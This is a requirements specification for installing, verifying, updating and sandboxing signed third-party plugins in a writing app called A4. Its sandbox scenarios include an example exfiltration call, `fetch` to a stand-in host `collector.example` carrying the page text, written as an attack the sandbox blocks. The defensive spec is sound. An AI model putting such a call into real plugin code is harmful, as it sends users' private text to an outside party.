# Spec Delta

## Purpose

Lets an author install a signed third-party pen or overlay from a file or a
URL, see who made it, and run it in a sandbox that holds it to its own card,
so A4's privacy, fit, and no-overwrite rules hold whoever wrote the plugin.

## ADDED Requirements

### Requirement: Install from a file
The Models section SHALL offer Install plugin. Choosing a package file SHALL
check it fully, as `a4 plugin verify` does, before showing anything to
install. A package that fails a check SHALL be refused with the reason, and
nothing SHALL be stored.

#### Scenario: A valid file
- **WHEN** the author chooses the packed Word length example
- **THEN** the install dialog opens, and nothing is stored until they confirm

#### Scenario: A tampered file
- **WHEN** the author chooses a package whose signature doesn't verify
- **THEN** A4 says the package's signature doesn't match, and no install dialog opens

### Requirement: Install from a URL
Install plugin SHALL also accept an HTTPS URL. A4 SHALL fetch the package
from it only when the author asks, send no page text with the request, and
check the package as it checks a file. A4 SHALL remember the URL for update
checks. A URL that isn't HTTPS SHALL be refused without a request.

#### Scenario: An HTTP URL
- **WHEN** the author pastes `http://example.com/word-length.a4plugin`
- **THEN** A4 makes no request and says the URL must use HTTPS

#### Scenario: A host that blocks cross-origin requests
- **WHEN** the package's host doesn't allow A4 to fetch it
- **THEN** A4 says the plugin couldn't be downloaded from that URL and suggests downloading the file and installing it from the file

### Requirement: The install dialog
Before installing, A4 SHALL show the plugin's name, version, and description,
its publisher and fingerprint, and whether it's a pen, an overlay, or both.
It SHALL also show where it sends page text (on this device, or the host it
names), its download size, and the credentials it asks for. Only Install
SHALL install, and Cancel SHALL store nothing.

#### Scenario: A pen that sends text away
- **WHEN** the author opens the install dialog for a pen whose card names `api.example.com`
- **THEN** the dialog says the pen sends page text to `api.example.com`, and only after the author confirms each call

### Requirement: Known publishers
A4 SHALL ship a list of known publishers, each a name and a public key. A
package signed by a listed key SHALL show that name with a Known publisher
badge. Any other package SHALL show "Unknown publisher" with the name it
gives and its fingerprint. The list SHALL change only with a new version of
A4.

#### Scenario: A package that claims a known name
- **GIVEN** "Example Labs" is on the list with key A
- **WHEN** a package names its publisher "Example Labs" but is signed with key B
- **THEN** it shows "Unknown publisher", the name it gives, and key B's fingerprint, with no badge

### Requirement: Pinned publisher keys
Installing a plugin SHALL pin its id to the key that signed it. A package
with that id signed by any other key SHALL be refused while the plugin is
installed. A third-party plugin SHALL NOT take a bundled plugin's id.

#### Scenario: The same id from another key
- **GIVEN** `example.word-length` is installed, signed by key A
- **WHEN** the author installs a package with the id `example.word-length` signed by key B
- **THEN** A4 refuses it and says another publisher's plugin already uses that id

#### Scenario: A bundled plugin's id
- **WHEN** a package's card uses the id of Semantic repetition
- **THEN** A4 refuses it and says that id belongs to a built-in plugin

### Requirement: Updates
A package for an installed plugin SHALL install as an update only when the
pinned key signed it and its version is newer. The update dialog SHALL show
both versions and any change to where text goes, the download size, or the
credentials. For a plugin installed from a URL, Check for update SHALL fetch
the URL only when the author asks.

#### Scenario: An older version
- **GIVEN** version 1.2.0 is installed
- **WHEN** the author installs version 1.1.0 of the same plugin, signed by the same key
- **THEN** A4 refuses it and says a newer version is installed

#### Scenario: An update that starts sending text away
- **GIVEN** version 1.0.0 keeps text on the device
- **WHEN** version 2.0.0 names `api.example.com` as its destination
- **THEN** the update dialog says the plugin will now send page text to `api.example.com`, and the update waits for the author to confirm

#### Scenario: No background checks
- **WHEN** the author opens A4 with a plugin installed from a URL
- **THEN** A4 makes no request to that URL until the author chooses Check for update

### Requirement: Installed plugins persist
Installed plugins SHALL be kept in this browser across reloads, with their
code, pinned key, source URL, and downloaded files. A4 SHALL check each
plugin's signature and code digest again every time it starts the plugin. A
plugin that fails the check SHALL be shown as damaged and SHALL NOT run.

#### Scenario: A reload
- **GIVEN** the author installed Word length
- **WHEN** they reload A4
- **THEN** Word length is still listed, and its lens works without installing it again

#### Scenario: Stored code that changed
- **GIVEN** an installed plugin's stored code was changed outside A4
- **WHEN** A4 next starts the plugin
- **THEN** the plugin doesn't run, and the Models section shows it as damaged, with Remove

### Requirement: The sandbox keeps on-device plugins on the device
An installed plugin whose card keeps text on the device SHALL be unable to
make any network request. Fetching, opening a socket, or loading a script
from any URL SHALL fail inside the plugin.

#### Scenario: An overlay that tries to send the page
- **GIVEN** an installed on-device overlay whose code calls `fetch("https://collector.example/")` with the page text
- **WHEN** it scores a page
- **THEN** the request is blocked before it leaves the browser, and no request reaches `collector.example`

### Requirement: The sandbox holds remote plugins to their host
An installed plugin whose card sends text off the device SHALL be able to
reach only the HTTPS host its card names. A request to any other host SHALL
fail inside the plugin. Every call SHALL still need the author's consent, as
for bundled remote plugins.

#### Scenario: A pen that calls a second host
- **GIVEN** an installed pen whose card names `api.example.com`
- **WHEN** its code also sends the page to `collector.example`
- **THEN** that request is blocked, and only `api.example.com` can be reached

### Requirement: The sandbox shares nothing with the app
An installed plugin SHALL have no access to the app's pages, storage,
cookies, credentials, or document. It SHALL receive only what the host sends
it: the sheet views its card declares, the model files it downloaded, and the
credentials its card declares.

#### Scenario: A plugin that reads storage
- **WHEN** an installed plugin tries to open IndexedDB or read local storage
- **THEN** the attempt fails, and it can't read any page or setting

### Requirement: Model files for installed plugins
An installed plugin's model files SHALL be downloaded only after the author
asks, with the download size shown first. They SHALL come from the URLs in
the signed manifest, be checked against their digests, and be kept for later
sessions.

#### Scenario: First use of an installed overlay with a model
- **WHEN** the author turns on the lens of an installed overlay that needs a 12 MB model
- **THEN** they are told the download size and asked before anything is downloaded

### Requirement: Installed overlays as lenses
Each plane an installed overlay declares SHALL be offered as a model lens. Its
legend SHALL name the plane, the plugin, and the publisher. An on-device
overlay's lens SHALL rescore 1,500 ms after the author stops typing. A remote
overlay SHALL score only when the author asks, with consent each time.

#### Scenario: Turning on an installed lens
- **GIVEN** Word length is installed
- **WHEN** the author chooses its lens
- **THEN** the page is scored once, the sheet is tinted by word length, and the legend names Word length and its publisher

#### Scenario: A remote overlay while typing
- **GIVEN** a remote overlay's lens is on
- **WHEN** the author types
- **THEN** nothing is sent, and the lens offers to score again with consent

### Requirement: Installed pens
An installed pen SHALL run from the Models section with one of its card's
instructions. The host SHALL lay out each attempt and ask for repairs up to
the card's most attempts. A result SHALL open as a new page named after the
source with the pen's name in parentheses, in Compare as page B. The source
SHALL NOT change.

#### Scenario: Running Hard wrap
- **GIVEN** Hard wrap is installed and a page named "Notes" is open
- **WHEN** the author runs Hard wrap
- **THEN** a new page "Notes (Hard wrap)" opens as page B in Compare, and "Notes" is unchanged

#### Scenario: A pen that fails
- **WHEN** an installed pen crashes during a run
- **THEN** the run ends with an error within 1 second, and no page is created

### Requirement: Removing a plugin
Remove SHALL delete an installed plugin's code, its downloaded files, its
pinned key, and its source URL, and turn off any lens it provides. Pages a
pen created SHALL remain.

#### Scenario: Removing a pen after using it
- **GIVEN** Hard wrap created "Notes (Hard wrap)"
- **WHEN** the author removes Hard wrap
- **THEN** Hard wrap is no longer listed, and "Notes (Hard wrap)" is still in the library
